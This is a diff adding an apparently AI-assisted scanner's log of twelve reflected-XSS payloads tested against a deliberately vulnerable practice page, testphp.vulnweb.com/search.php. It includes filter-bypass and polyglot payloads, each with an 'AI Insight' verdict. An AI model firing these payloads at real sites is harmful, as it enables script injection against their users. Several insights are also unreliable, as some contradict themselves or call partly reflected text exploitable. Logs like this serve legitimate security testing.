@@ -1,0 +1,62 @@
+Scan initiated for http://testphp.vulnweb.com/search.php?test=query at 2025-07-12 15:59:36
+
+--- VULNERABILITY FOUND ---
+  [+] URL:      http://testphp.vulnweb.com/search.php?test=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
+  [+] Payload:  <script>alert('XSS')</script>
+  [+] AI Insight: VULNERABLE: Reflected in the error message within the HTML response, inside a string that's then interpreted by the browser.
+
+--- VULNERABILITY FOUND ---
+  [+] URL:      http://testphp.vulnweb.com/search.php?test=%3Cscr%3Cscript%3Eipt%3Ealert%28%27XSS%27%29%3C%2Fscr%3Cscript%3Eipt%3E
+  [+] Payload:  <scr<script>ipt>alert('XSS')</scr<script>ipt>
+  [+] AI Insight: VULNERABLE: Reflected in an error message within the HTML response, which is an executable context.
+
+--- VULNERABILITY FOUND ---
+  [+] URL:      http://testphp.vulnweb.com/search.php?test=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
+  [+] Payload:  "><script>alert('XSS')</script>
+  [+] AI Insight: VULNERABLE: Reflected in the error message displayed within the HTML response, which is an executable context.
+
+--- VULNERABILITY FOUND ---
+  [+] URL:      http://testphp.vulnweb.com/search.php?test=%27%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
+  [+] Payload:  '><script>alert('XSS')</script>
+  [+] AI Insight: VULNERABLE: Reflected in an error message within the HTML body, which is an executable context.  The injected script is not executed directly, but the reflected payload within the error message itself is directly rendered, making it vulnerable.
+
+--- VULNERABILITY FOUND ---
+  [+] URL:      http://testphp.vulnweb.com/search.php?test=%3Cimg+src%3Dx+onerror%3Dalert%28%27XSS%27%29%3E
+  [+] Payload:  <img src=x onerror=alert('XSS')>
+  [+] AI Insight: VULNERABLE: Reflected in the error message displayed within the content region,  which is an executable context.  The injected payload caused a SQL error, and part of the payload ('XSS') is present in the error message.
+
+--- VULNERABILITY FOUND ---
+  [+] URL:      http://testphp.vulnweb.com/search.php?test=%3Csvg+onload%3Dalert%28%27XSS%27%29%3E
+  [+] Payload:  <svg onload=alert('XSS')>
+  [+] AI Insight: VULNERABLE: Reflected in an error message within the HTML response, which is an executable context.
+
+--- VULNERABILITY FOUND ---
+  [+] URL:      http://testphp.vulnweb.com/search.php?test=%3Cbody+onload%3Dalert%28%27XSS%27%29%3E
+  [+] Payload:  <body onload=alert('XSS')>
+  [+] AI Insight: VULNERABLE: Reflected in an error message within the content_rgn editable region, resulting in the browser attempting to execute the injected JavaScript.
+
+--- VULNERABILITY FOUND ---
+  [+] URL:      http://testphp.vulnweb.com/search.php?test=%3Ciframe+src%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2Fiframe%3E
+  [+] Payload:  <iframe src="javascript:alert('XSS');"></iframe>
+  [+] AI Insight: VULNERABLE: Reflected in an error message displayed within the HTML response, which is an executable context.
+
+--- VULNERABILITY FOUND ---
+  [+] URL:      http://testphp.vulnweb.com/search.php?test=%3Cdetails+open+ontoggle%3Dalert%28%27XSS%27%29%3E
+  [+] Payload:  <details open ontoggle=alert('XSS')>
+  [+] AI Insight: VULNERABLE: Reflected in an error message displayed directly in the HTML response, which is an executable context.
+
+--- VULNERABILITY FOUND ---
+  [+] URL:      http://testphp.vulnweb.com/search.php?test=jaVasCript%3A%2F%2A-%2F%2A%60%2F%2A%5C%60%2F%2A%27%2F%2A%22%2F%2A%2A%2F%28%2F%2A+%2A%2FoNcliCk%3Dalert%28%29+%29%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--%21%3E%5Cx3csVg%2F%3CsVg%2FoNloAd%3Dalert%28%29%2F%2F%3E%5Cx3e
+  [+] Payload:  jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+  [+] AI Insight: VULNERABLE: Reflected in an error message, which is still an executable context.  The injected `onClick` event is partially visible in the error message and could potentially be parsed by a browser, leading to XSS.
+
+--- VULNERABILITY FOUND ---
+  [+] URL:      http://testphp.vulnweb.com/search.php?test=javascript%3A%22%2F%2A%27%2F%2A%60%2F%2A--%3E%3C%2Fnoscript%3E%3C%2Ftitle%3E%3C%2Ftextarea%3E%3C%2Fstyle%3E%3C%2Ftemplate%3E%3C%2Fnoembed%3E%3C%2Fscript%3E%3Chtml+%5C%22+onmouseover%3D%2F%2A%26lt%3Bsvg%2F%2A%2Fonload%3Dalert%281%29%2F%2F%3E
+  [+] Payload:  javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(1)//>
+  [+] AI Insight: VULNERABLE: Reflected in the error message, which is displayed within the HTML response, making it executable.
+
+--- VULNERABILITY FOUND ---
+  [+] URL:      http://testphp.vulnweb.com/search.php?test=%22+autofocus+onfocus%3Dalert%281%29+%22
+  [+] Payload:  " autofocus onfocus=alert(1) "
+  [+] AI Insight: VULNERABLE: Reflected in the `searchFor` input field's `value` attribute, which is an executable context.  The `autofocus` and `onfocus` attributes are directly interpreted by the browser.
+
